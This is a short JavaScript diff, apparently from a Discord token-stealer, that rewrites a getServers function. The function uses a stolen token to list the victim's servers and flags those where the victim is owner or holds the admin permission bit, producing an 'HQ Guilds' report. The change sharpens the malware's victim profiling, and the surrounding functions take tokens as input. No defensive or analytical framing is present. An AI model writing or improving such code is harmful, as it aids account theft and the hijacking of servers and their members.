@@ -319,20 +319,20 @@ const getFriends = async token => {
 
 const getServers = async token => {
     const guilds = await fetchServers(token);
-
-    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
-    let rareGuilds = "";
+    const permAdmin = 8;
+    const filteredGuilds = guilds.filter((guild) => (Number(guild.permissions) & permAdmin) || guild.owner);
+    let message = "";
     for (const guild of filteredGuilds) {
-        if (rareGuilds === "") {
-            rareGuilds += `**Rare Servers:**\n`;
+        if (message === "") {
+            message += "**HQ Guilds:**\n";
         }
-        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        const ownerOrAdmin = guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin";
+        const members = guild.approximate_member_count ?? 0;
+        message += `${ownerOrAdmin} | \`${guild.name} - Members: ${members}\`\n`;
     }
-
-    rareGuilds = rareGuilds || "**No Rare Servers**";
-
+    message = message || "**No HQ Guilds**";
     return {
-        message: rareGuilds,
+        message,
         totalGuilds: guilds.length,
     };
 };
